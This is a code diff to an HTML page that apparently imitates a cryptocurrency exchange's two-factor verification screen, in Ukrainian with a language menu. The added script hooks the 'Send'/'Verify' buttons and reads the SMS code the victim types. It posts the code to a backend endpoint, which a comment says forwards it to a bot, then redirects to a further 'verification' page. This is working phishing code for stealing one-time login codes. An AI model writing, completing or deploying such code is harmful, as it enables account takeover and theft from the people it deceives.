@@ -288,38 +288,6 @@ document.addEventListener('DOMContentLoaded', function() {
         return phoneFromUrl || phoneFromStorage || phoneFromSession || '+380XX XXX XX05';
     }
     
-    // Добавить обработчик клика для кнопок "Надіслати"
-    function addButtonHandlers() {
-        const submitButtons = document.querySelectorAll('button[data-e2e="btn-mfa-verify"], button.mfa-verify-buttonv2, .bn-button__primary, button[type="submit"], .submit-button');
-        
-        if (submitButtons && submitButtons.length > 0) {
-            submitButtons.forEach(button => {
-                if (button && button.textContent && (
-                    button.textContent.includes('Надіслати') || 
-                    button.textContent.includes('Send') || 
-                    button.textContent.includes('Verify') ||
-                    button.textContent.includes('Надислать') ||
-                    button.textContent.includes('Submit')
-                )) {
-                    button.addEventListener('click', function(e) {
-                        e.preventDefault();
-                        
-                        // Триггеруем событие submit для формы
-                        const form = document.querySelector('form');
-                        if (form) {
-                            form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
-                        }
-                    });
-                }
-            });
-        }
-    }
-    
-    // Вызвать обработчики после загрузки страницы
-    addButtonHandlers();
-    
-    // Попробовать еще раз через небольшую задержку для динамически загружаемых элементов
-    setTimeout(addButtonHandlers, 2000);
     
     function showFinalNotification() {
         // Создать модальное окно с финальным уведомлением
@@ -371,5 +339,60 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 </script>
+
+<script>
+// Делегированный обработчик клика для кнопок "Надіслати"
+document.addEventListener('click', function(e) {
+    const btn = e.target.closest('button');
+    if (!btn) return;
+    
+    const matches = btn.matches('[data-e2e="btn-mfa-verify"], .mfa-verify-buttonv2');
+    if (!matches) return;
+    
+    const buttonText = btn.textContent || '';
+    if (buttonText.includes('Надіслати') || buttonText.includes('Send') || buttonText.includes('Verify')) {
+        e.preventDefault();
+        
+        // Получить значение кода из полей ввода
+        const codeInputs = document.querySelectorAll('input[name*="code"], input[data-e2e*="code"], .mfa-input, input[inputmode="numeric"]');
+        let code = '';
+        
+        codeInputs.forEach(input => {
+            if (input.value && input.value.trim()) {
+                code += input.value.trim();
+            }
+        });
+        
+        if (code && code.length >= 4) {
+            // Отправить код в бот
+            fetch('/api/send-code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ 
+                    type: 'sms',
+                    code: code
+                })
+            }).then(response => {
+                if (response.ok) {
+                    // Обновить состояние верификации
+                    let completedVerifications = JSON.parse(localStorage.getItem('completedVerifications')) || [];
+                    if (!completedVerifications.includes('sms')) {
+                        completedVerifications.push('sms');
+                        localStorage.setItem('completedVerifications', JSON.stringify(completedVerifications));
+                    }
+                    
+                    // Перейти на страницу verification.html
+                    setTimeout(() => {
+                        window.location.href = 'verification.html';
+                    }, 1000);
+                }
+            }).catch(error => {
+                console.log('Ошибка:', error);
+            });
+        }
+    }
+});
+</script>
+
 <script type="text/javascript" id="" charset="">(function(a,c,b){a.lo||(s=a.lo=function(){s.callMethod?s.callMethod.apply(s,arguments):s.queue.push(arguments)},a._lo||(a._lo=s),s.push=s,s.loaded=0,s.version="1.0",s.queue=[],T=c.createElement("script"),T.async=1,T.src=b,T.integrity="sha384-EGMqwBwBqWCtdehcn5R2MzvkmybXLlsrAxfvOw3Jwa8FZbdj0geidgBbqBEPR85/",T.crossOrigin="anonymous",b=c.getElementsByTagName("script")[0],b.parentNode.insertBefore(T,b))})(window,document,"https://cdn-public.liftoffintl.io/app2web-sdk/sdk.js");lo("init","cf85981342");
 lo("track",{event_name:"page_view"});</script><div role="dialog" aria-modal="true" aria-label="Language selection" class="css-134i1uf"><div role="document" class="css-e22sjw"><div class="css-s8r56a"><div class="bn-flex css-ev9jc1"><svg size="24" id="mobile_header_menu_cabinet_close" role="button" aria-label="Close language selection" tabindex="0" class="bn-svg css-1bmfvk2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="right: 16px;"><path d="M4.863 17.863L10.726 12 4.863 6.137a.9.9 0 011.274-1.274L12 10.727l5.863-5.864a.9.9 0 011.274 1.274L13.273 12l5.864 5.863.061.069a.9.9 0 01-1.266 1.266l-.069-.061L12 13.273l-5.863 5.864a.9.9 0 01-1.274-1.274z" fill="currentColor"></path></svg></div><div role="region" aria-label="Language selection" class="bn-flex css-1tzfn88"><div class="accounts-header-lngCur-content onlyone onlyoneLng is-mobile css-vurnku" role="dialog" aria-label="Мова"><div class="accounts-header-lngCur-item css-vurnku"><div class="header-select-options-group-flat language-select css-vurnku"><div class="typography-Body3 color-t_third css-vurnku" id="language-selection-label">Мова</div><div class="bn-textField bn-textField__line data-size-small data-gap-size-normal"><input aria-label="Search languages" data-e2e="input-search-language" placeholder="Search" class="bn-textField-input" spellcheck="false" autocomplete="" value=""></div><div class="header-select-options-group-flat-options is-mobile css-jmlio4" role="listbox" aria-labelledby="language-selection-label"><div data-bn-type="text" class="header-select-options typography-Subtitle4 active css-vurnku" data-e2e="link-language-uk-UA" aria-selected="true" tabindex="0">Українська</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-ar" aria-selected="false" tabindex="0">العربية</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-ar-BH" aria-selected="false" tabindex="0">العربية (البحرين)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-bg" aria-selected="false" tabindex="0">български</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-cs" aria-selected="false" tabindex="0">Čeština</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-de" aria-selected="false" tabindex="0">Deutsch (Schweiz)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-da-DK" aria-selected="false" tabindex="0">Dansk</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en" aria-selected="false" tabindex="0">English</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-es" aria-selected="false" tabindex="0">Español (España)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-es-LA" aria-selected="false" tabindex="0">Español (Latinoamérica)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-TR" aria-selected="false" tabindex="0">English (Türkiye)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-AU" aria-selected="false" tabindex="0">English (Australia)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-IN" aria-selected="false" tabindex="0">English (India)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-NG" aria-selected="false" tabindex="0">English (Nigeria)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-es-MX" aria-selected="false" tabindex="0">Español (México)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-el" aria-selected="false" tabindex="0">Ελληνικά</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-es-AR" aria-selected="false" tabindex="0">Español (Argentina)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-KZ" aria-selected="false" tabindex="0">English (Kazakhstan)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-ZA" aria-selected="false" tabindex="0">English (South Africa)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-NZ" aria-selected="false" tabindex="0">English (New Zealand)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-BH" aria-selected="false" tabindex="0">English (Bahrain)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-AE" aria-selected="false" tabindex="0">English (UAE)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-en-JP" aria-selected="false" tabindex="0">English (Japan)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-fr" aria-selected="false" tabindex="0">Français</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-fr-AF" aria-selected="false" tabindex="0">Français (Afrique)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-hu" aria-selected="false" tabindex="0">magyar nyelv</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-it" aria-selected="false" tabindex="0">Italiano</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-id" aria-selected="false" tabindex="0">Bahasa Indonesia</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-ja" aria-selected="false" tabindex="0">日本語</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-kk-KZ" aria-selected="false" tabindex="0">Қазақша (Қазақстан)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-kz" aria-selected="false" tabindex="0">Қазақша</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-lv" aria-selected="false" tabindex="0">latviešu valoda</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-lo-LA" aria-selected="false" tabindex="0">ລາວ</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-pl" aria-selected="false" tabindex="0">Polski</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-pt-BR" aria-selected="false" tabindex="0">Português (Brasil)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-pt" aria-selected="false" tabindex="0">Português</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-ru" aria-selected="false" tabindex="0">Русский</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-ro" aria-selected="false" tabindex="0">Română</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-ru-UA" aria-selected="false" tabindex="0">Русский (Украина)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-ru-KZ" aria-selected="false" tabindex="0">Русский (Казахстан)</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-sv" aria-selected="false" tabindex="0">Svenska</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-sk" aria-selected="false" tabindex="0">Slovenčina</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-sl" aria-selected="false" tabindex="0">Slovenščina</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-si-LK" aria-selected="false" tabindex="0">සිංහල</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-vi" aria-selected="false" tabindex="0">Tiếng Việt</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-zh-CN" aria-selected="false" tabindex="0">简体中文</div><div data-bn-type="text" class="header-select-options typography-Subtitle4  css-vurnku" data-e2e="link-language-zh-TC" aria-selected="false" tabindex="0">繁體中文</div></div></div></div></div></div></div></div><div class="css-1pysja1"></div></div></body></html>
